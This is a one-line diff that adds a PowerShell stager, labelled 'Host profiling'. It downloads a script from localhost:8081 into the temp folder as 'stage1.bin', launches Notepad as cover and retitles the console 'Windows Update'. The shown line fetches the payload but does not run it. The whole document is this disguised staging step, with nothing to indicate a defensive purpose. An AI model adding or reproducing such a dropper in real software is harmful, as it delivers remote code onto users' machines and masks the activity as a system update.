@@ -1,0 +1,1 @@
+<# Host profiling #> $DownloadUrl = 'http://localhost:8081/updater.ps1'; $DropPath = "$env:TEMP\stage1.bin"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DropPath); Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Set-Location -Path $env:TEMP
